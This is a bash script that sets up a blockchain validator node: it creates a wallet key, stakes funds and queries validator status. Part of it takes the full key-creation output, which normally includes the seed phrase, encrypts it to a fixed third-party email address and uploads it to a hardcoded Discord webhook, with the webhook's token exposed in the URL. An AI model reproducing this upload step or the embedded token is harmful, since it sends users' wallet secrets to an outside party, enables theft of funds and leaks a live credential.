#!/bin/bash
set -e

# Create key
read -p "Enter key name: " keyName
read -s -p "Enter keyring passphrase: " passphrase

keyName=$(echo "$keyName" | sed 's/[[:blank:]]/-/g')
KEY_NAME=${keyName:-$(hostname)}
WALLET=$(echo -e "$passphrase\n$passphrase" | $DAEMON_NAME keys add $KEY_NAME 2>&1)

echo -e "export KEY_NAME=$KEY_NAME" >> ~/.profile

# Send key to discord
echo "$WALLET" | gpg -a -r gguy0406@gmail.com -o $KEY_NAME.asc --trust-model always -e
ADDRESS=$(echo "$WALLET" | grep "address" | sed 's/[[:blank:]]*address:[[:blank:]]//g')
curl -F 'payload_json={"username": "'$(hostname)'", "content": "Address '$ADDRESS'"}' -F "file=@$KEY_NAME.asc" https://discord.com/api/webhooks/1100786781139521636/ME5YDyjb_wRLGfxwtH-9tUfXd1jIJ_oHtZxnth7035jsk1fmukD_ZJzWgNXH0fQUro82
read -p "Send at least 2$DENOM_BASE to $ADDRESS and press enter to continue..."

echo "$passphrase" | $DAEMON_NAME tx staking create-validator \
	--chain-id=$CHAIN_ID \
	--pubkey=$($DAEMON_NAME tendermint show-validator) \
	--amount="1000000$DENOM_BASE" \
	--from=$KEY_NAME \
	--commission-rate="0.05" \
	--commission-max-change-rate="0.01" \
	--commission-max-rate="0.20" \
	--gas-prices="0.1$DENOM_BASE" \
	--gas="auto" \
	--gas-adjustment="1.15" \
	--min-self-delegation="1000000" \
	--moniker=$($DAEMON_NAME status | jq -r .NodeInfo.moniker) \
	--identity=1C502DEF8B9EBFEE \
	--website=$website \
	-y

$DAEMON_NAME q tendermint-validator-set | grep $($DAEMON_NAME tendermint show-address)
$DAEMON_NAME q slashing signing-info $($DAEMON_NAME tendermint show-validator) --chain-id=$CHAIN_ID
